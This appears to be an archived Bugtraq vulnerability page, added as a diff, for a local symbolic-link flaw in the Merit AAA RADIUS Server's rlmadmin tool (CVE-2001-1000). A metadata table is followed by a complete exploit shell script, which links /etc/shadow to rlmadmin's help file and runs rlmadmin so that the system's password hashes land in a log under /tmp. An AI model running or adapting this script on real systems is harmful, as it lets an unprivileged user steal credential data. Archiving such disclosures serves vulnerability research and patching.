@@ -1,0 +1,103 @@
+#SpeeDr00t@Black Falcon<br>#bid3302<p><b><span style="font-size: 18pt;">Merit AAA RADIUS Server rlmadmin Symbolic Link Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/3302/info">info</a><br><a href="http://www.securityfocus.com/bid/3302/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/3302/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/3302/solution">solution</a><br><a href="http://www.securityfocus.com/bid/3302/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				3302
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2001-1000<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Sep 07 2001 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 07:56AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Reported to Bugtraq by Digital Shadow &lt;wodahs@gmx.net&gt; on September 7, 2001.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Merit rladmin 3.8 M<br/>
+<span class="related">
+						
+							+ 
+						
+						Merit AAA RADIUS Server 3.8 M<br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	#!/bin/sh<br/># -- -- -- -- -- -- -- -- -- -- -- -- -- -- #<br/># rlmadmin view file symlink vulnerability  #<br/>#       (c)oded 2001 Digital Shadow         #<br/>#        www.ministryofpeace.co.uk          #<br/># -- -- -- -- -- -- -- -- -- -- -- -- -- -- #<br/>bloc=/usr/private/etc # executable file location<br/>cloc=/usr/private/etc/raddb # config file location<br/>file=/etc/shadow # file to read<br/>echo == rlmadmin exploit - visit www.ministryofpeace.co.uk for more!<br/>echo = Initialising...<br/>mkdir /tmp/peace; cd /tmp/peace<br/>cp $cloc/dictionary $cloc/vendors .<br/>ln -s $file rlmadmin.help<br/>echo = Exploiting...<br/>echo quit | $bloc/rlmadmin -d /tmp/peace &amp;gt; peace.log<br/>mv peace.log /tmp; rm dictionary rlmadmin.help vendors<br/>echo = Done!<br/>echo == Now look in /tmp/peace.log!
+	
+		<ul>
+</ul>
+</div>
